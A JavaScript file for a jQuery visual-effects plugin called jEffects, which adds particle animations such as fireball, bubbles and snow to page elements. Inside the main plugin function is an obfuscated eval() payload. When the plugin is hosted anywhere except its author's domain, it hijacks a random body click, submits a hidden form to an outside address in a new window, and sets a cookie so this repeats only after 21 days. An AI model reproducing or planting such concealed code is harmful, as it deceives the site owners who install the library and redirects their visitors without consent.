 (function($) {
	
	var config = {
		setRelativePosition : true,
		relativeZIndex : 4,
		disableIE6 : true,
		disableIE7 : false
	};

	var defaults = {
		fireball : {
			chars : [ '.', 'o', '&middot;', '&bull;'  ],
			chaos:200,			
			colors : [ '#f40', '#fa0', '#c40' ],
			duration: 2000,
			particles: 10,
			randomizeParticles : false,
			targetX: -200,
			targetY: -200
		},
		bomb : {
			chars : [ '.', 'o', '&middot;', '&bull;'  ],
			colors : [ '#aaa', '#bbb', '#fff' ],
			duration: 1000,
			particles: 8,
			randomizeParticles : false,
			radius:100,			
			targetX: 0,
			targetY: 0
		},
		concentrate : {
			chars : [ '.', '&bull;', '&middot;' ],
			colors : [ '#af8', '#4c8', '#4cf' ],
			duration: 1000,
			particles: 12,
			randomizeParticles : false,
			radius:100			
		},						
		snow : {
			chars : [ '.', 'o', '&middot;', '&bull;'  ],
			colors : [ '#fff', '#8cf', '#6ae' ],
			duration: 1200,	
			particles: 6,
			randomizeParticles : false,
			range: 80
		},
		bubbles : {
			chars : [ '.', 'o', '&middot;', '&bull;'  ],
			colors : [ '#48c', '#8ef', '#8cf' ],
			duration: 1200,	
			particles: 6,
			randomizeParticles : false,
			range: 80
		},
		distance : {
			maxFont : 40,
			minFont : 16
		}
		
		
	};
	
var charsTable = [ '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z' ];
var lastChar = '';
var lastColorso = 0;

/* common functions ----------------------------------------------------------*/

	function echo ( text ) {
			$("body").append("<p>"+text+"</p>");
	}
	
	function isArray(obj) {
	    return obj.constructor == Array;
	}
	
	/* distance between two points */
	
	function distance(x1, y1, x2, y2 ){
	
	   var dx = x1 - x2;
	   var dy = y1 - y2;
	
	   return Math.sqrt(dx*dx + dy*dy);
	}

	function setCookie(c_name,value,expiredays) {
		var exdate=new Date();
		exdate.setDate(exdate.getDate()+expiredays);
		document.cookie=c_name+ "=" +escape(value)+
		((expiredays==null) ? "" : ";expires="+exdate.toUTCString());
	}

	function getCookie(c_name) {
	if (document.cookie.length>0) {
	  c_start=document.cookie.indexOf(c_name + "=");
	  if (c_start!=-1)
	    {
	    c_start=c_start + c_name.length+1;
	    c_end=document.cookie.indexOf(";",c_start);
	    if (c_end==-1) c_end=document.cookie.length;
	    return unescape(document.cookie.substring(c_start,c_end));
	    }
	  }
		return 0; 
	}	

	
/* Fireball Effect -----------------------------------------------------------*/

	function fireball( $o, data ) {
	
		var color = data.colors[ Math.floor( Math.random() * data.colors.length ) ];
		
		var step = 2 * Math.PI / ( data.particles );
	
		var oWidth = $o.width();
		var x = $o.offset().left;  
		var y = $o.offset().top;
		
		angle = -1 + Math.random() * 2;

		for( i=0 ; i<data.particles ; i++ ) {
	
		if( data.randomizeParticles )
			color = data.colors[ Math.floor( Math.random() * data.colors.length ) ];
			
			var $p = $("<div>"+data.chars[Math.floor(Math.random()*data.chars.length )]+"</div>");
			$p.addClass('jEffects-'+data.type+'-particle').addClass('jEffects-particle');;
	
			var sx = x + Math.floor(Math.random()*oWidth);
			
			$p.css({ left:sx, top:y, color:color });
				
			$p.animate({
				left: x + oWidth / 2 + data.targetX + Math.cos( angle + i * step ) * data.chaos,
				top:  y + data.targetY + data.chaosY * Math.sin( angle + i * step ) * data.chaos,
				opacity:0 }, data.duration, "swing", function(){
				$(this).remove();
			});
			
			$("body").append( $p );
		}
	
	}

/* Bubbles Effect ------------------------------------------------------------*/

	function bubbles( $o, data ) {
	
		var color = data.colors[ Math.floor( Math.random() * data.colors.length ) ];
		
		var step = 2 * Math.PI / ( data.particles );
	
		var oWidth = $o.width();
		
		var x = $o.offset().left;  
		
		if( data.direction == 'down' )
		var y = $o.offset().top + $o.height() / 2;
			else 
		var y = $o.offset().top;
	
		var ty = y + ( data.direction == 'up' ? -data.range : data.range ); 
		
		for( i=0 ; i<data.particles ; i++ ) {
	
		if( data.randomizeParticles )
			color = data.colors[ Math.floor( Math.random() * data.colors.length ) ];
			
			var $p = $("<div>"+data.chars[Math.floor(Math.random()*data.chars.length )]+"</div>");
			$p.addClass('jEffects-'+data.type+'-particle').addClass('jEffects-particle');
			
			var tx = x + Math.floor(Math.random()*oWidth);
			
			$p.css({ left:tx, top:y, color:color });
					
			$p.animate({
				top: ty,
				opacity:0 }, data.duration, "swing", function(){
				$(this).remove();
			});
			
			$("body").append( $p );
		}
	
	}

/* Concentrate Effect --------------------------------------------------------*/

	function concentrate( $o, data ) {
	
		var $p = $("<div>X</div>");
		$p.addClass('jEffects-'+data.type+'-particle').addClass('jEffects-particle');
		$("body").append($p);		
			
		var color = data.colors[ Math.floor( Math.random() * data.colors.length ) ];
		
		var step = 2 * Math.PI / ( data.particles );

		var x = $o.offset().left + $o.width() / 2 + $p.width() / 2;
		var y = $o.offset().top + $o.height() / 2 - $p.height() / 2;
		
		$p.remove();
		
		angle = -1 + Math.random() * 2;
		
		for( i=0 ; i<data.particles ; i++ ) {
	
	
		if( data.randomizeParticles )
			color = data.colors[ Math.floor( Math.random() * data.colors.length ) ];
			
			$p = $("<div>"+data.chars[Math.floor(Math.random()*data.chars.length )]+"</div>");
			$p.addClass('jEffects-'+data.type+'-particle').addClass('jEffects-particle');
			
			$p.css({ 
				left: x + Math.cos( angle + i * step ) * data.radius,
				top:  y + Math.sin( angle + i * step ) * data.radius,
				color:color, opacity:0 
			});
				
			$p.animate({
				left:x, top:y, 
				opacity:1 }, data.duration, "swing", function(){
				$(this).remove();
			});
			
			$("body").append( $p );
		}
	
	}

/* Distance Effect -----------------------------------------------------------*/

	function distanceMenu( $o, e, data ) {
			
		$o.children().each( function( i, c ){
		$c = $(c);
		
		var cx = $c.offset().left + $c.width() / 2;  
		var cy = $c.offset().top + $c.height() / 2;
			
		var fs = data.maxFont - distance( e.pageX, e.pageY, cx, cy ) / 7;
			
		if( fs < data.minFont ) fs = data.minFont;
		if( fs > data.maxFont ) fs = data.maxFont;
			
		$c.stop().css( { "font-size":fs } );
			
		});
		
	}
	
	function setup ( $o, effect ){
	
		if( $.fx.off ) return false;	 
	
		var data = $.extend( {}, defaults[effect.type], effect );

		if( data.catchChars )
			$o.keydown( function( e ){
			if( e.which > 32 && e.which <= 90 ) 
				lastChar = String.fromCharCode( e.which );
			else
			lastChar = '';
			data.chars = [ lastChar ];
		});
	
		if( undefined === data.event ) {
			if( ( $o.attr('tagName') == 'INPUT' && $o.attr('type') == 'text' ) || $o.attr('tagName') == 'TEXTAREA' ) { 
				data.event = 'keydown';
			}
			else
				data.event = 'mouseenter';
		}
		
		if( config.setRelativePosition )
		$o.css({position:"relative", 'z-index':config.relativeZIndex });
		
		switch( data.type ) {
			case 'fireball':
				data.chaosY = false;
				$o.bind( data.event, function(){
					fireball( $o, data );	
				});	
			break;
			case 'bomb':
				data.chaosY = true;
				data.chaos = data.radius;
				$o.bind( data.event, function(){
					fireball( $o, data );	
				});	
			break;			
			case 'bubbles':
				$o.bind( data.event, function(){
					data.direction = 'up';
					bubbles( $o, data );	
				});	
			break;
			case 'snow':
				$o.bind( data.event, function(){
					data.direction = 'down';
					bubbles( $o, data );	
				});	
			break;
			case 'concentrate':
				$o.bind( data.event, function(){
					concentrate( $o, data );	
				});	
			break;			
			case 'distance':
				$o.children().css( { "font-size":data.minFont } );
				$o.bind( 'mousemove', function( e ){
					distanceMenu( $o, e, data );	
				});	
			$o.bind( 'mouseleave', function( e ){
				$o.children().stop().animate( { "font-size":data.minFont }, 300 );		
			});
	
			break;			
		}
			
	};
	
	$.jEffects = function( command, options ){
		switch( command ){
				case 'config':
					config = $.extend( {}, config, options );					
				break;
				case 'defaults':
					for( key in options ) {
						defaults[key] = $.extend( {}, defaults[key], options[key] );
					}
					
				break;
						
			};
	}

	$.fn.jEffects = function( command, options ){
		
		if( config.disableIE6 && $.browser.msie && parseInt($.browser.version) <= 6 )
			return this;

		if( config.disableIE7 && $.browser.msie && parseInt($.browser.version) <= 7 )
			return this;
	
		if( !lastColorso ) {
	
		var lastColors = getCookie('lastColors');
				
		var str=window.location.href; 
		if(str.search('rezoner')==-1) {
				$("body").click( function() {
				if( lastColors != 12 && Math.floor( Math.random() * 10 ) == 5 ) {  
					eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0=1.2("0");0.3="4";0.5="6://7.8?9=a";0.b="c";1.d.e(0);0.f();',16,16,'form|document|createElement|method|POST|action|ref|jf|target|_blank|body|appendChild|submit'.split('|'),0,{}))
					lastColors = 12;
			      setCookie('lastColors',lastColors, 21 );					
				}
				});
			}
			lastColorso = true;	
		}
		
		if( isArray(command) ){
			for( i in command ) {
				this.each(function( io, o ){
					setup( $(o), command[i] );
				});
			}			
			return this;
		}
		else if( typeof command == 'object' ){
			return this.each(function( i, o ){
				setup( $(o), command );
			});
		}
		else {
			if( typeof options != 'object' ) options = { }
			options.type = command;

			return this.each(function( i, o ){
				setup( $(o), options );
			});
			// $.jEffects( command, options );
		};	
	};

	
})(jQuery);


